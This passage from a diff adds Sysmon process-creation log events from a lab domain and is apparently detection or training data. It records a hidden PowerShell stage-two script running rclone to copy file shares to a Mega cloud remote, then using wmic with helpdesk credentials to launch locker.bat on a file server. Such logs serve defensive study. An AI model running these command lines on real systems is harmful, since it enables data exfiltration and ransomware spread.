+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFyrsIg",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "type": "filebeat",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\C0015\\rclone.exe",
+            "--config",
+            "C:\\ProgramData\\C0015\\rclone.conf",
+            "copy",
+            "--max-age",
+            "2y",
+            "\\\\FS01\\Shares",
+            "Mega:DATA",
+            "-q",
+            "--ignore-existing",
+            "--auto-confirm",
+            "--multi-thread-streams",
+            "7",
+            "--transfers",
+            "7",
+            "--bwlimit",
+            "10M"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "1.75.1",
+            "product": "Rclone",
+            "imphash": "70df50797f7a85a271c38135c5679c40",
+            "description": "Rclone",
+            "original_file_name": "rclone.exe",
+            "company": "https://rclone.org"
+          },
+          "name": "rclone.exe",
+          "pid": 7800,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 17,
+          "entity_id": "{88E52A21-98AA-6AE0-D504-000000002600}",
+          "hash": {
+            "sha256": "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c"
+          },
+          "executable": "C:\\ProgramData\\C0015\\rclone.exe",
+          "command_line": "\"C:\\ProgramData\\C0015\\rclone.exe\" --config C:\\ProgramData\\C0015\\rclone.conf copy --max-age 2y \\\\FS01\\Shares Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M"
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228905",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "https://rclone.org",
+            "Description": "Rclone",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Rclone",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "1.75.1",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:22.139\nProcessGuid: {88E52A21-98AA-6AE0-D504-000000002600}\nProcessId: 7800\nImage: C:\\ProgramData\\C0015\\rclone.exe\nFileVersion: 1.75.1\nDescription: Rclone\nProduct: Rclone\nCompany: https://rclone.org\nOriginalFileName: rclone.exe\nCommandLine: \"C:\\ProgramData\\C0015\\rclone.exe\" --config C:\\ProgramData\\C0015\\rclone.conf copy --max-age 2y \\\\FS01\\Shares Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=033EEE51C9AD47C2DE2624B6674D355274BCD6CF0027A5F85DB4437BA24AE81C,IMPHASH=70DF50797F7A85A271C38135C5679C40\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:22.139Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c",
+            "70df50797f7a85a271c38135c5679c40"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:28Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:27:23.702Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFyrsI4",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create cmd.exe",
+            "/c",
+            "C:\\locker.bat"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 7120,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 5,
+          "entity_id": "{88E52A21-98AC-6AE0-D604-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"cmd.exe /c C:\\locker.bat\"\""
+        },
+        "winlog": {
+          "record_id": "1228926",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "Description": "Windows Command Processor",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:24.438\nProcessGuid: {88E52A21-98AC-6AE0-D604-000000002600}\nProcessId: 7120\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"cmd.exe /c C:\\locker.bat\"\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:24.438Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:28Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:27:25.710Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    }
+  ]
+}
